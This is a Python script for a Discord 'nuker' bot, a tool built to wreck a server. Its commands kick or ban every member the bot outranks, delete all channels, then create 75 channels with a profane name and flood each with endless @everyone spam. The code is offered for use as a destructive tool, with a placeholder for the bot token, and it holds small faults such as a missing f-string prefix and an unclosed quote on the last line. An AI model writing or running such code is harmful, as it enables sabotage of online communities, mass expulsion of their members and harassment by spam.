import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.bans = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} online')

async def fast_spam(channel):
    while True:
        try:
            await channel.send("@everyone NUKED AND FUCKED BY [whatever you want to add]")
        except:
            return

@bot.command()
@commands.has_permissions(administrator=True)
async def kickall(ctx):
    count = 0
    for m in list(ctx.guild.members):
        if m == ctx.guild.me:
            continue
        if m.top_role >= ctx.guild.me.top_role:
            continue
        try:
            await m.kick(reason="nuked")
            count += 1
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True, ban_members=True)
async def banall(ctx):
    count = 0
    for m in list(ctx.guild.members):
        if m == ctx.guild.me:
            continue
        if m.top_role >= ctx.guild.me.top_role:
            continue
        try:
            await ctx.guild.ban(m, reason="nuked", delete_message_days=0)
            count += 1
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True, ban_members=True)
async def unbanall(ctx):
    count = 0
    bans = [entry async for entry in ctx.guild.bans(limit=1000)]
    for entry in bans:
        try:
            await ctx.guild.unban(entry.user)
            count += 1
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    asyncio.create_task(banall(ctx))

    delete_tasks = [ch.delete() for ch in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    await asyncio.sleep(0.4)

    for i in range(75):
        try:
            ch = await ctx.guild.create_text_channel("fucked-by-the-author-{i+1:03d}")
            bot.loop.create_task(fast_spam(ch))
        except:
            break

bot.run('add your discord bot token here)
